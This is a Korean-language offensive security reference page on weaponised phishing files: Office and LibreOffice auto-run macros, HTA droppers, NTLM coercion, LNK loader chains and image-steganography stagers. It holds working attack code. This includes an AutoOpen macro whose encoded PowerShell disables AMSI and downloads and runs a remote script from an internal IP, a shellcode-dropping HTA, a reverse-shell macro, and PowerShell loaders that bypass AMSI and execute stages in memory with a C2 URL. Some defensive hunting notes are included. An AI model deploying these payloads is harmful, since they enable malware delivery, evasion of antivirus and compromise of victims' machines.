# Phishing 파일 및 문서

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터를 검증합니다. 데이터 검증은 OfficeOpenXML 표준을 기준으로 데이터 구조를 식별하는 방식으로 수행됩니다. 데이터 구조를 식별하는 과정에서 오류가 발생하면 분석 중인 파일이 열리지 않습니다.

일반적으로 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경하여 파일 이름을 바꾸더라도 매크로 실행 기능은 그대로 유지할 수 있습니다.\
예를 들어 RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일의 이름을 RTF로 변경하면 Microsoft Word에서 해당 파일을 처리하며 매크로를 실행할 수 있습니다.\
동일한 내부 구조와 메커니즘이 Microsoft Office Suite의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령을 사용하면 일부 Office 프로그램에서 실행되는 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX 파일이 원격 템플릿을 참조하는 경우(File –Options –Add-ins –Manage: Templates –Go), 해당 템플릿에 매크로가 포함되어 있으면 매크로도 “실행”할 수 있습니다.

### External Image Load

다음으로 이동: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: 다음으로 이동: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

매크로를 사용하여 문서에서 임의의 코드를 실행할 수 있습니다.

#### Autoload functions

더 일반적으로 사용되는 함수일수록 AV가 탐지할 가능성이 높습니다.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

**File > Info > Inspect Document > Inspect Document**로 이동하면 Document Inspector가 열립니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭합니다.

#### Doc 확장자

완료되면 **Save as type** 드롭다운을 선택하고, 형식을 **`.docx`**에서 Word 97-2003 **`.doc`**으로 변경합니다.\
`.docx`에는 **매크로를 저장할 수 없고**, 매크로가 활성화된 **`.docm`** 확장자에는 **stigma**가 **있기** 때문입니다(예: 썸네일 아이콘에 커다란 `!`가 표시되고 일부 웹/이메일 gateway는 해당 파일을 완전히 차단합니다). 따라서 이 **legacy `.doc` 확장자가 가장 좋은 절충안**입니다.

#### 악성 매크로 생성기

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 자동 실행 매크로 (Basic)

LibreOffice Writer 문서는 Basic 매크로를 포함할 수 있으며, 매크로를 **Open Document** 이벤트에 바인딩하여 파일이 열릴 때 자동으로 실행할 수 있습니다(Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 간단한 reverse shell 매크로는 다음과 같습니다:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
문자열 내부의 이중 따옴표(`""`)에 유의하세요. LibreOffice Basic에서는 이중 따옴표를 사용해 리터럴 따옴표를 이스케이프하므로, `...==""")`로 끝나는 payload는 내부 명령과 Shell 인자를 모두 올바르게 짝지을 수 있습니다.

전달 팁:

- `.odt`로 저장하고 매크로를 문서 이벤트에 연결하여 문서를 열 때 즉시 실행되도록 합니다.
- `swaks`로 이메일을 보낼 때는 `--attach @resume.odt`를 사용합니다(`@`가 필요하며, 그래야 파일 이름 문자열이 아니라 파일 바이트가 첨부 파일로 전송됩니다). 이는 검증 없이 임의의 `RCPT TO` 수신자를 허용하는 SMTP 서버를 악용할 때 중요합니다.

## HTA 파일

HTA는 **HTML과 스크립팅 언어(예: VBScript 및 JScript)를 결합한** Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저 보안 모델의 제약 없이 "완전히 신뢰된" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용하여 실행되며, 일반적으로 **Internet Explorer와 함께 설치**되므로 **`mshta`는 IE에 의존**합니다. 따라서 IE가 제거된 경우 HTA를 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication 강제

**원격으로** **NTLM 인증을 강제**하는 방법은 여러 가지가 있습니다. 예를 들어 사용자가 접속할 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(HTTP MitM도 가능할까요?). 또는 사용자가 **폴더를 열기만 해도** **인증을 트리거**하는 파일의 **주소**를 피해자에게 보낼 수도 있습니다.

**다음 페이지에서 이러한 아이디어와 그 외 방법을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

해시나 인증 정보만 탈취할 수 있는 것이 아니라 **NTLM relay 공격을 수행**할 수도 있다는 점을 잊지 마세요.

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

매우 효과적인 campaign에서는 합법적인 decoy 문서(PDF/DOCX) 두 개와 악성 .lnk가 포함된 ZIP을 전달합니다. 핵심은 실제 PowerShell loader가 고유한 marker 뒤의 ZIP raw bytes 내부에 저장되며, .lnk가 이를 추출하고 완전히 메모리에서 실행한다는 것입니다.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner에서 구현되는 일반적인 흐름:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% 및 현재 working directory의 parent에서 원본 ZIP을 찾습니다.
2) ZIP bytes를 읽고 hardcoded marker(예: xFIQCV)를 찾습니다. marker 뒤의 모든 내용이 embedded PowerShell payload입니다.
3) ZIP을 %ProgramData%에 복사하고 그곳에서 extract한 다음, 정상적인 문서처럼 보이도록 decoy .docx를 엽니다.
4) 현재 process에서 AMSI를 bypass합니다: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 stage를 deobfuscate하고(예: 모든 # 문자를 제거) 메모리에서 실행합니다.

embedded stage를 추출하고 실행하는 PowerShell skeleton 예시:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
메모
- Delivery는 신뢰할 수 있는 PaaS subdomain(예: `*.herokuapp.com`)을 자주 악용하며, payload를 gate할 수 있습니다(IP/UA에 따라 정상적인 ZIP 파일 제공).
- 다음 단계에서는 base64/XOR shellcode를 decrypt한 후 Reflection.Emit + VirtualAlloc을 통해 실행하여 disk artifact를 최소화하는 경우가 많습니다.

같은 chain에서 사용되는 Persistence
- Microsoft Web Browser control의 COM TypeLib hijacking을 수행하여 IE/Explorer 또는 이를 embed하는 모든 앱이 payload를 자동으로 re-launch하도록 합니다.<sup>[[2]](#references)[[4]](#references)</sup> 자세한 내용과 바로 사용할 수 있는 commands는 여기에서 확인할 수 있습니다:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- archive data 뒤에 ASCII marker string(예: xFIQCV)이 추가된 ZIP 파일.
- parent/user folder를 열거하여 ZIP을 찾고 decoy document를 여는 `.lnk`.
- `[System.Management.Automation.AmsiUtils]::amsiInitFailed`를 통한 AMSI tampering.
- 신뢰할 수 있는 PaaS domain에서 호스팅되는 links로 종료되는 장시간 실행 business thread.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

반복적으로 관찰되는 또 다른 pattern은 **document를 impersonate하는 `.lnk`**로, background에서 실제 chain을 staging하는 동시에 정상적인 lure를 즉시 엽니다.<sup>[[3]](#references)</sup>

관찰된 workflow:
1. Shortcut은 **PDF로 masquerade**하고 `conhost.exe` 또는 유사한 proxy를 사용하여 난독화된 PowerShell downloader를 spawn합니다.
2. PowerShell은 명확한 tokens(`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`)을 fragment하므로, `iwr`, `gci`, `ren`, `cpi` 또는 `schtasks`를 찾는 단순한 detections가 command를 놓칩니다.
3. Stager는 먼저 **decoy document를 download**하여 victim에게 열어 준 다음, background에서 malicious files를 reconstruct합니다.
4. Payload는 **junk extensions**로 작성된 후 filler characters를 제거하여 rename될 수 있으므로, 명확한 `.exe` / `.cpl` artifact가 나타나는 시점이 지연됩니다.
5. User-writable path에서 trusted host binary를 launch하는 **minute-based scheduled task**를 통해 Persistence가 설정됩니다.

이 pattern에서 확인할 수 있는 최소한의 hunting 단서:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
인식해야 할 유용한 staging 구조는 다음과 같습니다:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 또는 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 두 번째 stage가 은밀한 이유

Rapid7 case study에서 scheduled task는 `C:\Users\Public\`의 **`Fondue.exe`**를 반복적으로 실행했습니다. **`APPWIZ.cpl`**이 그 옆에 staging되어 있고 **`RunFODW`**를 export했기 때문에, 신뢰된 Microsoft binary는 정상적인 system copy 대신 attacker의 CPL을 side-load했습니다.

CPL은 다음 작업을 수행합니다:
- `C:\Windows\Tasks\editor.dat`에서 **AES-256-CBC** blob을 읽음
- **Windows CNG / `bcrypt.dll`**을 통해 이를 decrypt함
- executable memory를 할당하고 decrypt된 shellcode를 복사함
- shellcode pointer를 **`EnumUILanguagesW`**의 callback으로 전달하여 간접적으로 실행함

마지막 단계는 별도로 hunting할 가치가 있습니다. malware는 직접적인 `((void(*)())buf)()` jump를 피하고, 대신 **정상적인 callback-taking WinAPI**를 악용하여 execution을 전환하는 경우가 많습니다.

이 campaign에서 decrypt된 payload는 **Donut** shellcode였으며, 이후 최종 PE를 완전히 memory에 map하고 현재 process에서 **AMSI/WLDP/ETW**를 patch한 다음 execution을 넘겼습니다. side-loading 및 memory-resident post-processing에 대한 자세한 내용은 다음을 참조하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

실용적인 hunting pivot:
- `powershell.exe` 또는 `conhost.exe`를 실행한 뒤 눈에 보이는 decoy 문서를 표시하는 `.lnk`.
- **`C:\Users\Public\`**으로 단기간 download한 후, 의미 없는 extension에서 즉시 rename하는 동작.
- `GoogleErrorReport`와 같이 평범한 이름을 사용하며 **user-writable directories**에서 실행되는 scheduled task.
- 동일한 non-system directory에서 **`.cpl` / `.dll`** 파일을 로드하는 trusted binary.
- **`C:\Windows\Tasks\`** 아래에 기록된 Base64 text blob을 side-loaded module이 읽는 동작.

## 이미지에 steganography-delimited payload를 숨기는 방식 (PowerShell stager)

최근 loader chain은 obfuscated JavaScript/VBS를 전달하며, 이 파일은 Base64 PowerShell stager를 decode하고 실행합니다. 해당 stager는 image(주로 GIF)를 download하며, image에는 고유한 시작/종료 marker 사이에 일반 text로 숨겨진 Base64-encoded .NET DLL이 포함되어 있습니다. script는 이러한 delimiter를 검색하고(실제 환경에서 확인된 예: «<<sudo_png>> … <<sudo_odt>>>»), 사이의 text를 추출한 뒤 Base64-decode하여 bytes로 변환하고, assembly를 memory에 로드한 다음 C2 URL과 함께 알려진 entry method를 invoke합니다.<sup>[[5]](#references)</sup>

워크플로
- Stage 1: Archived JS/VBS dropper → embedded Base64를 decode → `-nop -w hidden -ep bypass` 옵션으로 PowerShell stager를 실행.
- Stage 2: PowerShell stager → image를 download하고, marker로 구분된 Base64를 추출하며, .NET DLL을 memory에 로드한 뒤 해당 method를 호출함(예: VAI). 이때 C2 URL과 options를 전달.
- Stage 3: Loader가 최종 payload를 가져온 후 일반적으로 process hollowing을 통해 trusted binary(주로 MSBuild.exe)에 inject함.<sup>[[7]](#references)[[8]](#references)</sup> process hollowing 및 trusted utility proxy execution에 대한 자세한 내용은 다음을 참조하세요:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

image에서 DLL을 추출하고 memory에서 .NET method를 invoke하는 PowerShell 예시:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

참고
- 이는 ATT&CK T1027.003 (steganography/marker-hiding)입니다.<sup>[[6]](#references)</sup> Marker는 campaign마다 다릅니다.
- Assembly를 loading하기 전에 AMSI/ETW bypass와 string deobfuscation이 일반적으로 적용됩니다.
- Hunting: 다운로드한 image에서 알려진 delimiter를 scan하고, image에 access한 직후 Base64 blob을 decoding하는 PowerShell을 식별합니다.

stego tools 및 carving techniques도 참고하세요:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

반복적으로 사용되는 initial stage는 archive 내부에 전달되는 작고 매우 obfuscated된 `.js` 또는 `.vbs`입니다. sole purpose는 내장된 Base64 string을 decoding하고 `-nop -w hidden -ep bypass`를 사용해 PowerShell을 launch하여 HTTPS를 통해 다음 stage를 bootstrap하는 것입니다.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- 자신의 file contents 읽기
- junk strings 사이에 있는 Base64 blob 찾기
- ASCII PowerShell로 decoding
- `powershell.exe`를 invoke하는 `wscript.exe`/`cscript.exe`로 execute

Hunting 단서
- command line에 `-enc`/`FromBase64String`를 포함한 `powershell.exe`를 spawn하는 archived JS/VBS attachment.
- user temp path에서 `powershell.exe -nop -w hidden`을 launch하는 `wscript.exe`.

## NTLM hashes를 steal할 Windows files

**NTLM creds를 steal할 수 있는 places**에 관한 page를 확인하세요:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: 미국 기업을 대상으로 한 정교한 Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: 중국 테마 Loader Chain을 통한 Dropping Elephant Tradecraft 추적](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 새로운 COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader가 다양한 Infostealer를 전달](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
